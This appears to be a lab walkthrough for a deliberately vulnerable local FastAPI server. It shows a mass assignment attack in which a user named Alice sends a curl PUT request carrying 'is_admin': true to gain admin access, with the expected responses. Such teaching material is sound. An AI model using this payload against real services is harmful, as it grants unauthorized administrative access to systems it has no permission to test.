## Prerequisites
First, ensure the vulnerable mass assignment server is running with the following command:

```Bash

uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is for a regular user, Alice, to elevate her own privileges to become an administrator by sending a malicious payload to the profile update endpoint.

1. Verify Initial (Non-Admin) Status
Before the attack, we confirm that Alice does not have administrative privileges by trying to access the admin dashboard.

```Bash

curl "http://127.0.0.1:8000/admin/dashboard"
```

Expected Response (Access Denied):

```JSON

{"detail":"Forbidden: Admins only!"}
```
2. Perform the Exploit
Next, Alice sends a PUT request to the /users/me endpoint. The request body includes the fields required for validation (id, username) but also adds the is_admin field with a value of true.

```Bash

curl -X PUT "http://127.0.0.1:8000/users/me" \
     -H "Content-Type: application/json" \
     -d '{"id": 1, "username": "alice", "email": "new-email@example.com", "is_admin": true}'
```

The server accepts the request because it passes validation, and then blindly "assigns" all provided values to the user object in the database, including the malicious is_admin property.

Expected Response (Success):

```JSON

{
  "message": "Profile updated!",
  "user": {
    "id": 1,
    "username": "alice",
    "email": "new-email@example.com",
    "bio": "Just a regular user.",
    "is_admin": true
  }
}
```

3. Confirm Admin Privileges
To verify the privilege escalation, Alice tries to access the admin dashboard again.

```Bash

curl "http://127.0.0.1:8000/admin/dashboard"
```
Successful Exploit Response (Access Granted):

```JSON

{"message":"Welcome to the secret admin dashboard!"}
```

This confirms that Alice successfully exploited the Mass Assignment vulnerability to gain administrative access.